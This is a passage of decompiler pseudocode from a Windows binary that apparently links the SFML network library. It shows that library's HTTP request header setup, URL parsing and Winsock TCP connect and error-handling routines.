      if ( (unsigned int)(v59[0] - v15 - 4) > 0x1F )
        goto LABEL_111;
    }
    sub_46C87D(v15);
    v14 = v51;
  }
  if ( v14 )
  {
    v63 = 0;
    v64 = 15;
    LOBYTE(v62[0]) = 0;
    sub_41EF80(v62, "user@sfml-dev.org", 0x11u);
    LOBYTE(v69) = 6;
    v60 = 0;
    v61 = 15;
    LOBYTE(v59[0]) = 0;
    sub_41EF80(v59, "From", 4u);
    LOBYTE(v69) = 7;
    sub_431B30((int *)&v52, v59, (size_t *)v62);
    LOBYTE(v69) = 6;
    if ( v61 >= 0x10 )
    {
      v16 = v59[0];
      if ( v61 + 1 >= 0x1000 )
      {
        v16 = (void *)*((_DWORD *)v59[0] - 1);
        if ( (unsigned int)(v59[0] - v16 - 4) > 0x1F )
          goto LABEL_111;
      }
      sub_46C87D(v16);
    }
    LOBYTE(v69) = 4;
    if ( v64 >= 0x10 )
    {
      v17 = v62[0];
      if ( v64 + 1 >= 0x1000 )
      {
        v17 = (void *)*((_DWORD *)v62[0] - 1);
        if ( (unsigned int)(v62[0] - v17 - 4) > 0x1F )
          goto LABEL_111;
      }
      sub_46C87D(v17);
    }
  }
  v63 = 0;
  v64 = 15;
  LOBYTE(v62[0]) = 0;
  sub_41EF80(v62, "User-Agent", 0xAu);
  LOBYTE(v69) = 8;
  v18 = sub_42F690((int *)&v52, v62);
  LOBYTE(v69) = 4;
  v19 = !v18;
  v51 = v19;
  if ( v64 >= 0x10 )
  {
    v20 = v62[0];
    if ( v64 + 1 >= 0x1000 )
    {
      v20 = (void *)*((_DWORD *)v62[0] - 1);
      if ( (unsigned int)(v62[0] - v20 - 4) > 0x1F )
        goto LABEL_111;
    }
    sub_46C87D(v20);
    v19 = v51;
  }
  if ( v19 )
  {
    v60 = 0;
    v61 = 15;
    LOBYTE(v59[0]) = 0;
    sub_41EF80(v59, "libsfml-network/2.x", 0x13u);
    LOBYTE(v69) = 9;
    v63 = 0;
    v64 = 15;
    LOBYTE(v62[0]) = 0;
    sub_41EF80(v62, "User-Agent", 0xAu);
    LOBYTE(v69) = 10;
    sub_431B30((int *)&v52, v62, (size_t *)v59);
    LOBYTE(v69) = 9;
    if ( v64 >= 0x10 )
    {
      v21 = v62[0];
      if ( v64 + 1 >= 0x1000 )
      {
        v21 = (void *)*((_DWORD *)v62[0] - 1);
        if ( (unsigned int)(v62[0] - v21 - 4) > 0x1F )
          goto LABEL_111;
      }
      sub_46C87D(v21);
    }
    LOBYTE(v69) = 4;
    if ( v61 >= 0x10 )
    {
      v22 = v59[0];
      if ( v61 + 1 >= 0x1000 )
      {
        v22 = (void *)*((_DWORD *)v59[0] - 1);
        if ( (unsigned int)(v59[0] - v22 - 4) > 0x1F )
          goto LABEL_111;
      }
      sub_46C87D(v22);
    }
  }
  v63 = 0;
  v64 = 15;
  LOBYTE(v62[0]) = 0;
  sub_41EF80(v62, "Host", 4u);
  LOBYTE(v69) = 11;
  v23 = sub_42F690((int *)&v52, v62);
  LOBYTE(v69) = 4;
  v24 = !v23;
  v51 = v24;
  if ( v64 >= 0x10 )
  {
    v25 = v62[0];
    if ( v64 + 1 >= 0x1000 )
    {
      v25 = (void *)*((_DWORD *)v62[0] - 1);
      if ( (unsigned int)(v62[0] - v25 - 4) > 0x1F )
        goto LABEL_111;
    }
    sub_46C87D(v25);
    v24 = v51;
  }
  if ( v24 )
  {
    v63 = 0;
    v64 = 15;
    LOBYTE(v62[0]) = 0;
    sub_41EF80(v62, "Host", 4u);
    v26 = this;
    LOBYTE(v69) = 12;
    sub_431B30((int *)&v52, v62, this + 11);
    LOBYTE(v69) = 4;
    if ( v64 >= 0x10 )
    {
      v27 = v62[0];
      if ( v64 + 1 >= 0x1000 )
      {
        v27 = (void *)*((_DWORD *)v62[0] - 1);
        if ( (unsigned int)(v62[0] - v27 - 4) > 0x1F )
          goto LABEL_111;
      }
      sub_46C87D(v27);
    }
  }
  else
  {
    v26 = this;
  }
  v63 = 0;
  v64 = 15;
  LOBYTE(v62[0]) = 0;
  sub_41EF80(v62, "Content-Length", 0xEu);
  LOBYTE(v69) = 13;
  v28 = sub_42F690((int *)&v52, v62);
  LOBYTE(v69) = 4;
  v29 = !v28;
  v51 = v29;
  if ( v64 >= 0x10 )
  {
    v30 = v62[0];
    if ( v64 + 1 >= 0x1000 )
    {
      v30 = (void *)*((_DWORD *)v62[0] - 1);
      if ( (unsigned int)(v62[0] - v30 - 4) > 0x1F )
        goto LABEL_111;
    }
    sub_46C87D(v30);
    v29 = v51;
  }
  if ( v29 )
  {
    v66 = dword_4B8608;
    LOBYTE(v69) = 14;
    v5 = 8;
    v68 = &std::ostream::`vftable';
    v67[18] = 72;
    sub_421410((int)&v68, (int)v67, 0);
    v69 = 16;
    *(int *)((char *)&v67[-1] + v66[1]) = (int)&std::ostringstream::`vftable';
    *(_DWORD *)&v65[v66[1] + 868] = v66[1] - 80;
    sub_421380(v67);
    v67[0] = (int)&std::stringbuf::`vftable';
    v67[14] = 0;
    v67[15] = 4;
    LOBYTE(v69) = 17;
    sub_42A9A0((int *)&v66, v58[4]);
    v63 = 0;
    v64 = 15;
    LOBYTE(v62[0]) = 0;
    sub_41EF80(v62, "Content-Length", 0xEu);
    LOBYTE(v69) = 18;
    v31 = (size_t *)sub_431FB0((int)&v66, (int)v59);
    LOBYTE(v69) = 19;
    sub_431B30((int *)&v52, v62, v31);
    LOBYTE(v69) = 18;
    if ( v61 >= 0x10 )
    {
      v32 = v59[0];
      if ( v61 + 1 >= 0x1000 )
      {
        v32 = (void *)*((_DWORD *)v59[0] - 1);
        if ( (unsigned int)(v59[0] - v32 - 4) > 0x1F )
          goto LABEL_110;
      }
      sub_46C87D(v32);
    }
    v60 = 0;
    v61 = 15;
    LOBYTE(v59[0]) = 0;
    LOBYTE(v69) = 17;
    if ( v64 < 0x10 )
    {
LABEL_58:
      LOBYTE(v69) = 4;
      sub_42AFB0(&v66);
      goto LABEL_59;
    }
    v33 = v62[0];
    if ( v64 + 1 < 0x1000 || (v33 = (void *)*((_DWORD *)v62[0] - 1), (unsigned int)(v62[0] - v33 - 4) <= 0x1F) )
    {
      sub_46C87D(v33);
      goto LABEL_58;
    }
LABEL_110:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_59:
  if ( v54 != (_DWORD *)1
    || (v63 = 0,
        v64 = 15,
        LOBYTE(v62[0]) = 0,
        sub_41EF80(v62, "Content-Type", 0xCu),
        LOBYTE(v69) = 20,
        v5 |= 1u,
        v51 = 1,
        sub_42F690((int *)&v52, v62)) )
  {
    v51 = 0;
  }
  v69 = 4;
  if ( (v5 & 1) != 0 )
  {
    v5 &= ~1u;
    if ( v64 >= 0x10 )
    {
      v34 = v62[0];
      if ( v64 + 1 >= 0x1000 )
      {
        v34 = (void *)*((_DWORD *)v62[0] - 1);
        if ( (unsigned int)(v62[0] - v34 - 4) > 0x1F )
          goto LABEL_111;
      }
      sub_46C87D(v34);
    }
  }
  if ( v51 )
  {
    v60 = 0;
    v61 = 15;
    LOBYTE(v59[0]) = 0;
    sub_41EF80(v59, "application/x-www-form-urlencoded", 0x21u);
    LOBYTE(v69) = 21;
    v63 = 0;
    v64 = 15;
    LOBYTE(v62[0]) = 0;
    sub_41EF80(v62, "Content-Type", 0xCu);
    LOBYTE(v69) = 22;
    sub_431B30((int *)&v52, v62, (size_t *)v59);
    LOBYTE(v69) = 21;
    if ( v64 >= 0x10 )
    {
      v35 = v62[0];
      if ( v64 + 1 >= 0x1000 )
      {
        v35 = (void *)*((_DWORD *)v62[0] - 1);
        if ( (unsigned int)(v62[0] - v35 - 4) > 0x1F )
          goto LABEL_111;
      }
      sub_46C87D(v35);
    }
    LOBYTE(v69) = 4;
    if ( v61 >= 0x10 )
    {
      v36 = v59[0];
      if ( v61 + 1 >= 0x1000 )
      {
        v36 = (void *)*((_DWORD *)v59[0] - 1);
        if ( (unsigned int)(v59[0] - v36 - 4) > 0x1F )
          goto LABEL_111;
      }
      sub_46C87D(v36);
    }
  }
  if ( (unsigned int)v57 + 10 * v56 < 0xB
    || (v63 = 0,
        v64 = 15,
        LOBYTE(v62[0]) = 0,
        sub_41EF80(v62, "Connection", 0xAu),
        LOBYTE(v69) = 23,
        v5 |= 2u,
        v51 = 1,
        sub_42F690((int *)&v52, v62)) )
  {
    v51 = 0;
  }
  v69 = 4;
  if ( (v5 & 2) != 0 && v64 >= 0x10 )
  {
    v37 = v62[0];
    if ( v64 + 1 >= 0x1000 )
    {
      v37 = (void *)*((_DWORD *)v62[0] - 1);
      if ( (unsigned int)(v62[0] - v37 - 4) > 0x1F )
        goto LABEL_111;
    }
    sub_46C87D(v37);
  }
  if ( !v51 )
    goto LABEL_93;
  v60 = 0;
  v61 = 15;
  LOBYTE(v59[0]) = 0;
  sub_41EF80(v59, "close", 5u);
  LOBYTE(v69) = 24;
  v63 = 0;
  v64 = 15;
  LOBYTE(v62[0]) = 0;
  sub_41EF80(v62, "Connection", 0xAu);
  LOBYTE(v69) = 25;
  sub_431B30((int *)&v52, v62, (size_t *)v59);
  LOBYTE(v69) = 24;
  if ( v64 >= 0x10 )
  {
    v38 = v62[0];
    if ( v64 + 1 >= 0x1000 )
    {
      v38 = (void *)*((_DWORD *)v62[0] - 1);
      if ( (unsigned int)(v62[0] - v38 - 4) > 0x1F )
        goto LABEL_111;
    }
    sub_46C87D(v38);
  }
  LOBYTE(v69) = 4;
  if ( v61 < 0x10 )
    goto LABEL_93;
  v39 = v59[0];
  if ( v61 + 1 >= 0x1000 )
  {
    v39 = (void *)*((_DWORD *)v59[0] - 1);
    if ( (unsigned int)(v59[0] - v39 - 4) > 0x1F )
LABEL_111:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_46C87D(v39);
LABEL_93:
  *(_DWORD *)a2 = 0;
  *(_DWORD *)(a2 + 4) = 0;
  v40 = operator new(0x40u);
  *v40 = v40;
  v40[1] = v40;
  v40[2] = v40;
  *((_WORD *)v40 + 6) = 257;
  *(_DWORD *)a2 = v40;
  *(_DWORD *)(a2 + 8) = 1001;
  *(_DWORD *)(a2 + 12) = 0;
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 36) = 0;
  *(_DWORD *)(a2 + 40) = 15;
  *(_BYTE *)(a2 + 20) = 0;
  if ( !sub_432380(v26, v26 + 9, *((_WORD *)v26 + 34), a4) )
  {
    sub_4307B0(&v52, (int)v62);
    LOBYTE(v69) = 26;
    if ( v63 )
    {
      v41 = v62;
      if ( v64 >= 0x10 )
        v41 = (void **)v62[0];
      if ( !sub_432700(v26, (int)v41, v63) )
      {
        v60 = 0;
        v61 = 15;
        LOBYTE(v59[0]) = 0;
        v50 = 0;
        LOBYTE(v69) = 27;
        if ( !sub_432690(v26, v65, 1024, (int *)&v50) )
        {
          do
          {
            v42 = v59;
            v43 = v59;
            if ( v61 >= 0x10 )
              v42 = (void **)v59[0];
            v44 = (char *)v42 + v60;
            if ( v61 >= 0x10 )
              v43 = (void **)v59[0];
            v45 = (char *)v43 + v60;
            v46 = v59;
            v47 = v44 - v45;
            if ( v61 >= 0x10 )
              v46 = (void **)v59[0];
            sub_428030((const void **)v59, v45 - (char *)v46, v47, v65, (size_t)v50);
            v26 = this;
          }
          while ( !sub_432690(this, v65, 1024, (int *)&v50) );
          v4 = a2;
        }
        sub_42FA90(v4, v59);
        LOBYTE(v69) = 26;
        sub_4199E0(v59);
      }
    }
    sub_432610(v26);
    sub_4199E0(v62);
  }
  sub_4199E0(v58);
  sub_4199E0(v55);
  sub_4287B0((int)&v52, v52[1]);
  sub_46C87D(v52);
  return v4;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B857C: using guessed type void *std::ostream::`vftable';
// 4B85C4: using guessed type void *std::stringbuf::`vftable';
// 4B8604: using guessed type void *std::ostringstream::`vftable';
// 4B8608: using guessed type _DWORD dword_4B8608[2];
// 430D40: using guessed type int var_48C;
// 430D40: using guessed type _DWORD var_478[6];

//----- (00431B00) --------------------------------------------------------
void **__thiscall sub_431B00(void **this, int a2)
{
  void **result; // eax
  void **v3; // ecx
  void *v4; // edx

  result = (void **)a2;
  v3 = this + 11;
  if ( v3 != (void **)a2 )
  {
    v4 = (void *)a2;
    if ( *(_DWORD *)(a2 + 20) >= 0x10u )
      v4 = *(void **)a2;
    return sub_41EF80(v3, v4, *(_DWORD *)(a2 + 16));
  }
  return result;
}

//----- (00431B30) --------------------------------------------------------
void __thiscall sub_431B30(int *this, _DWORD *a2, size_t *a3)
{
  int *v4; // eax
  int *v5; // eax
  size_t *v6; // ecx
  _BYTE *v7; // ecx
  unsigned int v8; // edx
  __int128 v9; // [esp+0h] [ebp-50h] BYREF
  __int64 v10; // [esp+10h] [ebp-40h]
  _BYTE *v11; // [esp+28h] [ebp-28h] BYREF
  unsigned int v12; // [esp+3Ch] [ebp-14h]
  int v13; // [esp+4Ch] [ebp-4h]

  sub_419BE0(&v9, a2);
  v4 = (int *)sub_432070((int)&v11, v9, v10);
  v13 = 0;
  v5 = sub_42AC80(this, v4);
  if ( v5 != (int *)a3 )
  {
    v6 = a3;
    if ( a3[5] >= 0x10 )
      v6 = (size_t *)*a3;
    sub_41EF80((void **)v5, v6, a3[4]);
  }
  if ( v12 >= 0x10 )
  {
    v7 = v11;
    v8 = v12 + 1;
    if ( v12 + 1 >= 0x1000 )
    {
      v7 = (_BYTE *)*((_DWORD *)v11 - 1);
      v8 = v12 + 36;
      if ( (unsigned int)(v11 - v7 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v10) = v8;
    sub_46C87D(v7);
  }
}

//----- (00431C00) --------------------------------------------------------
int __thiscall sub_431C00(int this, size_t *a2, __int16 a3)
{
  size_t *v4; // edi
  size_t v5; // edx
  size_t *v6; // esi
  size_t *v7; // eax
  _DWORD *v8; // eax
  char v9; // al
  void *v10; // ecx
  const char *v11; // edx
  unsigned int v12; // eax
  size_t v13; // eax
  size_t v14; // ecx
  struct addrinfo *v15; // esi
  void *v16; // ecx
  const char *v17; // edx
  size_t v18; // edx
  size_t *v19; // eax
  _DWORD *v20; // eax
  char v21; // al
  void *v22; // ecx
  const char *v23; // edx
  int *v24; // eax
  int *v25; // edi
  int v26; // esi
  char *v27; // eax
  void (__thiscall ***v28)(_DWORD, int); // eax
  __int16 v29; // ax
  int v30; // ecx
  struct addrinfo *ai_flags; // eax
  unsigned int ai_addrlen; // edx
  size_t v33; // eax
  bool v34; // cf
  struct addrinfo *v35; // ecx
  _DWORD *v36; // eax
  int result; // eax
  __int128 v38; // [esp-1Ch] [ebp-64h] BYREF
  __int64 v39; // [esp-Ch] [ebp-54h]
  const char *v40; // [esp-4h] [ebp-4Ch]
  char v41[4]; // [esp+10h] [ebp-38h] BYREF
  __int128 *v42; // [esp+14h] [ebp-34h]
  size_t *v43; // [esp+18h] [ebp-30h]
  char v44; // [esp+1Fh] [ebp-29h]
  _QWORD v45[2]; // [esp+20h] [ebp-28h] BYREF
  int v46; // [esp+30h] [ebp-18h]
  unsigned int v47; // [esp+34h] [ebp-14h]
  int v48; // [esp+44h] [ebp-4h]
  int savedregs; // [esp+48h] [ebp+0h] BYREF

  v4 = a2;
  v5 = 7;
  v40 = "http://";
  v6 = a2 + 4;
  v7 = a2;
  v43 = a2 + 4;
  v39 = 0xF00000000i64;
  LOBYTE(v38) = 0;
  if ( a2[4] < 7 )
    v5 = *v6;
  if ( a2[5] >= 0x10 )
    v7 = (size_t *)*a2;
  sub_41EF80((void **)&v38, v7, v5);
  v8 = (_DWORD *)sub_432070((int)v45, v38, v39);
  v9 = sub_4232C0(v8, v40);
  v44 = v9;
  if ( v47 >= 0x10 )
  {
    v10 = (void *)v45[0];
    v11 = (const char *)(v47 + 1);
    if ( v47 + 1 >= 0x1000 )
    {
      v10 = *(void **)(LODWORD(v45[0]) - 4);
      v11 = (const char *)(v47 + 36);
      if ( (unsigned int)(LODWORD(v45[0]) - (_DWORD)v10 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v40 = v11;
    sub_46C87D(v10);
    v9 = v44;
  }
  if ( v9 )
  {
    v12 = *v6;
    v46 = 0;
    v47 = 15;
    LOBYTE(v45[0]) = 0;
    if ( v12 < 7 )
      goto LABEL_50;
    v13 = v12 - 7;
    v14 = -1;
    if ( v13 != -1 )
      v14 = v13;
    if ( a2[5] >= 0x10 )
      v4 = (size_t *)*a2;
    sub_41EF80((void **)v45, (char *)v4 + 7, v14);
    v15 = (struct addrinfo *)(this + 44);
    sub_419A60((_DWORD *)(this + 44), v45);
    if ( v47 >= 0x10 )
    {
      v16 = (void *)v45[0];
      v17 = (const char *)(v47 + 1);
      if ( v47 + 1 >= 0x1000 )
      {
        v16 = *(void **)(LODWORD(v45[0]) - 4);
        v17 = (const char *)(v47 + 36);
        if ( (unsigned int)(LODWORD(v45[0]) - (_DWORD)v16 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v40 = v17;
      sub_46C87D(v16);
    }
    goto LABEL_36;
  }
  v40 = "https://";
  v18 = 8;
  v19 = a2;
  v42 = &v38;
  v39 = 0xF00000000i64;
  LOBYTE(v38) = 0;
  if ( *v6 < 8 )
    v18 = *v6;
  if ( a2[5] >= 0x10 )
    v19 = (size_t *)*a2;
  sub_41EF80((void **)&v38, v19, v18);
  v20 = (_DWORD *)sub_432070((int)v45, v38, v39);
  v21 = sub_4232C0(v20, v40);
  v44 = v21;
  if ( v47 >= 0x10 )
  {
    v22 = (void *)v45[0];
    v23 = (const char *)(v47 + 1);
    if ( v47 + 1 >= 0x1000 )
    {
      v22 = *(void **)(LODWORD(v45[0]) - 4);
      v23 = (const char *)(v47 + 36);
      if ( (unsigned int)(LODWORD(v45[0]) - (_DWORD)v22 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v40 = v23;
    sub_46C87D(v22);
    v21 = v44;
  }
  if ( !v21 )
  {
    v15 = (struct addrinfo *)(this + 44);
    if ( (size_t *)(this + 44) != a2 )
    {
      if ( a2[5] >= 0x10 )
        v4 = (size_t *)*a2;
      sub_41EF80((void **)(this + 44), v4, *v43);
    }
LABEL_36:
    v29 = a3;
    if ( !a3 )
      v29 = 80;
    goto LABEL_38;
  }
  v40 = "HTTPS protocol is not supported by sf::Http";
  v24 = sub_468B30();
  v25 = (int *)sub_422D50(v24, v40);
  v42 = *(__int128 **)(*(int *)((char *)v25 + *(_DWORD *)(*v25 + 4) + 48) + 4);
  v26 = (int)v42;
  (*(void (__thiscall **)(int))(*(_DWORD *)v26 + 4))(v26);
  v48 = 0;
  v27 = sub_421800((int)&savedregs, (int)v41);
  LOBYTE(v43) = (*(int (__thiscall **)(char *, int))(*(_DWORD *)v27 + 32))(v27, 10);
  v48 = -1;
  if ( v26 )
  {
    v28 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v26 + 8))(v26);
    if ( v28 )
      (**v28)(v28, 1);
  }
  sub_4257E0(v25, (unsigned __int8)v43);
  sub_4212B0(v25);
  v15 = (struct addrinfo *)(this + 44);
  sub_41EF80((void **)(this + 44), &unk_4CCC25, 0);
  v29 = 0;
LABEL_38:
  *(_WORD *)(this + 68) = v29;
  v30 = *(_DWORD *)(this + 60);
  if ( v30 )
  {
    ai_flags = v15;
    if ( v15->ai_canonname >= (char *)0x10 )
      ai_flags = (struct addrinfo *)v15->ai_flags;
    ai_addrlen = v15->ai_addrlen;
    if ( *((_BYTE *)ai_flags + ai_addrlen - 1) == 47 )
    {
      v33 = v30 - 1;
      if ( ai_addrlen >= v30 - 1 )
      {
        v34 = v15->ai_canonname < (char *)0x10;
        v35 = v15;
        v15->ai_addrlen = v33;
        if ( !v34 )
          v35 = (struct addrinfo *)v15->ai_flags;
        *((_BYTE *)&v35->ai_flags + v33) = 0;
        goto LABEL_46;
      }
LABEL_50:
      sub_421040();
    }
  }
LABEL_46:
  v36 = sub_428890(v41, v15);
  *(_DWORD *)(this + 36) = *v36;
  result = v36[1];
  *(_DWORD *)(this + 40) = result;
  return result;
}
// 421040: using guessed type void __noreturn sub_421040(void);
// 431C00: using guessed type char var_38[4];

//----- (00431F20) --------------------------------------------------------
int __thiscall sub_431F20(_DWORD *this, int a2, int a3)
{
  int result; // eax

  this[9] = a2;
  result = a3;
  this[10] = a3;
  return result;
}

//----- (00431F40) --------------------------------------------------------
int __thiscall sub_431F40(_DWORD *this, int a2)
{
  int result; // eax

  result = a2;
  this[2] = a2;
  return result;
}

//----- (00431F50) --------------------------------------------------------
const void **__thiscall sub_431F50(void **this, size_t *a2)
{
  void **v3; // esi
  size_t *v4; // ecx
  const void **result; // eax

  v3 = this + 3;
  if ( this + 3 != (void **)a2 )
  {
    v4 = a2;
    if ( a2[5] >= 0x10 )
      v4 = (size_t *)*a2;
    sub_41EF80(v3, v4, a2[4]);
  }
  if ( !this[7] )
    return sub_41ED70((char *)v3, 0, "/", 1u);
  result = (const void **)v3;
  if ( (unsigned int)v3[5] >= 0x10 )
    result = (const void **)*v3;
  if ( *(_BYTE *)result != 47 )
    return sub_41ED70((char *)v3, 0, "/", 1u);
  return result;
}

//----- (00431FB0) --------------------------------------------------------
int __thiscall sub_431FB0(int this, int a2)
{
  int v3; // ecx
  unsigned int v4; // ebx
  int v5; // edx

  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
  v3 = *(_DWORD *)(this + 64);
  if ( (v3 & 2) != 0 || (v4 = **(_DWORD **)(this + 36)) == 0 )
  {
    if ( (v3 & 4) == 0 )
    {
      v5 = **(_DWORD **)(this + 32);
      if ( v5 )
        sub_41EF80((void **)a2, **(void ***)(this + 16), v5 + **(_DWORD **)(this + 48) - **(_DWORD **)(this + 16));
    }
  }
  else
  {
    if ( v4 < *(_DWORD *)(this + 60) )
      v4 = *(_DWORD *)(this + 60);
    sub_41EF80((void **)a2, **(void ***)(this + 20), v4 - **(_DWORD **)(this + 20));
  }
  return a2;
}

//----- (00432070) --------------------------------------------------------
int __cdecl sub_432070(int a1, __int128 a2, __int64 a3)
{
  unsigned int v3; // eax
  __int128 *v4; // edx
  __int128 *v5; // esi
  __int128 *v6; // ecx
  __int128 v7; // xmm0
  int result; // eax

  v3 = HIDWORD(a3);
  v4 = (__int128 *)a2;
  v5 = &a2;
  if ( HIDWORD(a3) >= 0x10 )
    v5 = (__int128 *)a2;
  while ( 1 )
  {
    v6 = &a2;
    if ( v3 >= 0x10 )
      v6 = v4;
    if ( v5 == (__int128 *)((char *)v6 + a3) )
      break;
    *(_BYTE *)v5 = tolower(*(char *)v5);
    v3 = HIDWORD(a3);
    v5 = (__int128 *)((char *)v5 + 1);
    v4 = (__int128 *)a2;
  }
  v7 = a2;
  *(_DWORD *)(a1 + 16) = 0;
  result = a1;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = v7;
  *(_QWORD *)(a1 + 16) = a3;
  return result;
}

//----- (004320E0) --------------------------------------------------------
int __thiscall sub_4320E0(int this)
{
  unsigned __int8 **v2; // edi
  unsigned __int8 *v3; // ecx
  unsigned int v5; // eax
  unsigned int v6; // esi
  unsigned int v7; // esi

  v2 = *(unsigned __int8 ***)(this + 28);
  v3 = *v2;
  if ( !*v2 )
    return -1;
  if ( v3 < &v3[**(_DWORD **)(this + 44)] )
    return *v3;
  v5 = **(_DWORD **)(this + 32);
  if ( !v5 || (*(_BYTE *)(this + 60) & 4) != 0 )
    return -1;
  v6 = *(_DWORD *)(this + 56);
  if ( v6 < v5 )
    v6 = **(_DWORD **)(this + 32);
  if ( v6 <= (unsigned int)v3 )
    return -1;
  *(_DWORD *)(this + 56) = v6;
  v7 = v6 - (_DWORD)*v2;
  *v2 = *v2;
  **(_DWORD **)(this + 44) = v7;
  return ***(unsigned __int8 ***)(this + 28);
}

//----- (00432140) --------------------------------------------------------
int __cdecl sub_432140(SOCKET s)
{
  return closesocket(s);
}

//----- (00432150) --------------------------------------------------------
int __cdecl sub_432150(int a1, u_long hostlong, u_short hostshort)
{
  *(_OWORD *)a1 = 0i64;
  *(_DWORD *)(a1 + 4) = htonl(hostlong);
  *(_WORD *)a1 = 2;
  *(_WORD *)(a1 + 2) = htons(hostshort);
  return a1;
}

//----- (00432190) --------------------------------------------------------
int sub_432190()
{
  int result; // eax

  switch ( WSAGetLastError() )
  {
    case 10035:
    case 10037:
      result = 1;
      break;
    case 10052:
    case 10053:
    case 10054:
    case 10057:
    case 10060:
      result = 3;
      break;
    case 10056:
      result = 0;
      break;
    default:
      result = 4;
      break;
  }
  return result;
}

//----- (004321F0) --------------------------------------------------------
int __cdecl sub_4321F0(SOCKET s, int argp)
{
  argp = (unsigned __int8)argp ^ 1;
  return ioctlsocket(s, -2147195266, (u_long *)&argp);
}

//----- (00432220) --------------------------------------------------------
_DWORD *__thiscall sub_432220(_DWORD *this)
{
  _DWORD *result; // eax

  sub_428520(this, 0);
  *this = &sf::TcpSocket::`vftable';
  result = this;
  this[4] = 0;
  this[5] = 0;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  return result;
}
// 4B884C: using guessed type void *sf::TcpSocket::`vftable';

//----- (00432270) --------------------------------------------------------
_DWORD *__thiscall sub_432270(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // edi
  _DWORD *v4; // esi
  _DWORD *v5; // eax

  v3 = a2 + 2;
  *this = *a2;
  v4 = this + 2;
  this[1] = a2[1];
  if ( this + 2 != a2 + 2 )
  {
    v5 = (_DWORD *)*v4;
    if ( *v4 )
    {
      if ( (unsigned int)(this[4] - (_DWORD)v5) >= 0x1000 )
      {
        if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v5 = (_DWORD *)*(v5 - 1);
      }
      sub_46C87D(v5);
      *v4 = 0;
      v4[1] = 0;
      v4[2] = 0;
    }
    *v4 = *v3;
    v4[1] = a2[3];
    v4[2] = a2[4];
    *v3 = 0;
    a2[3] = 0;
    a2[4] = 0;
  }
  return this;
}

//----- (00432310) --------------------------------------------------------
_DWORD *__thiscall sub_432310(_DWORD *this, char a2)
{
  _DWORD *v3; // eax

  v3 = (_DWORD *)this[6];
  if ( v3 )
  {
    if ( (unsigned int)(this[8] - (_DWORD)v3) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
    this[6] = 0;
    this[7] = 0;
    this[8] = 0;
  }
  sub_428550(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00432380) --------------------------------------------------------
int __thiscall sub_432380(_DWORD *this, u_long *a2, u_short a3, __int64 a4)
{
  void *v5; // ecx
  u_long v6; // eax
  int v7; // eax
  char v9; // bl
  int v10; // eax
  int v11; // eax
  int v12; // esi
  int v13; // eax
  int v14; // esi
  int v15; // eax
  u_long v16; // eax
  struct timeval timeout; // [esp+Ch] [ebp-140h] BYREF
  int v18[2]; // [esp+14h] [ebp-138h] BYREF
  int namelen; // [esp+1Ch] [ebp-130h] BYREF
  fd_set writefds; // [esp+20h] [ebp-12Ch] BYREF
  struct sockaddr name; // [esp+124h] [ebp-28h] BYREF
  int v22; // [esp+134h] [ebp-18h] BYREF
  struct sockaddr v23; // [esp+138h] [ebp-14h] BYREF

  sub_428630(this);
  v22 = 0;
  memset(&v23, 0, sizeof(v23));
  sub_432270(this + 4, &v22);
  v5 = *(void **)&v23.sa_data[2];
  if ( *(_DWORD *)&v23.sa_data[2] )
  {
    if ( (unsigned int)(*(_DWORD *)&v23.sa_data[10] - *(_DWORD *)&v23.sa_data[2]) >= 0x1000 )
    {
      v5 = *(void **)(*(_DWORD *)&v23.sa_data[2] - 4);
      if ( (unsigned int)(*(_DWORD *)&v23.sa_data[2] - (_DWORD)v5 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v5);
  }
  sub_428660((int)this);
  v6 = sub_428FC0(a2);
  name = *(struct sockaddr *)sub_432150((int)&v23, v6, a3);
  if ( sub_468A20(a4, qword_4F0148) )
  {
    v7 = sub_428750(this);
    if ( connect(v7, &name, 16) == -1 )
      return sub_432190();
    return 0;
  }
  v9 = sub_428760(this);
  LOBYTE(namelen) = v9;
  if ( v9 )
    sub_428770((int)this, 0);
  v10 = sub_428750(this);
  if ( connect(v10, &name, 16) >= 0 )
  {
    sub_428770((int)this, namelen);
    return 0;
  }
  v11 = sub_432190();
  v12 = v11;
  if ( v9 )
  {
    if ( v11 == 1 )
    {
      writefds.fd_count = 1;
      writefds.fd_array[0] = sub_428750(this);
      timeout.tv_sec = sub_468A40(&a4) / 1000000;
      timeout.tv_usec = sub_468A40(&a4) % 1000000;
      v13 = sub_428750(this);
      if ( select(v13 + 1, 0, &writefds, 0, &timeout) <= 0 )
        goto LABEL_22;
      v14 = sub_428750(this);
      if ( v14 == sub_408730() || (namelen = 16, v15 = sub_428750(this), getpeername(v15, &v23, &namelen) == -1) )
      {
        v18[0] = dword_4EED88;
        v18[1] = dword_4EED8C;
      }
      else
      {
        v16 = ntohl(*(u_long *)&v23.sa_data[2]);
        sub_4288B0(v18, v16);
      }
      if ( sub_4288E0(v18, &dword_4EED88) )
        v12 = 0;
      else
LABEL_22:
        v12 = sub_432190();
    }
    sub_428770((int)this, 1);
  }
  return v12;
}
// 4EED88: using guessed type int dword_4EED88;
// 4EED8C: using guessed type int dword_4EED8C;
// 4F0148: using guessed type __int64 qword_4F0148;

//----- (00432610) --------------------------------------------------------
void __thiscall sub_432610(_DWORD *this)
{
  _BYTE *v2; // edx
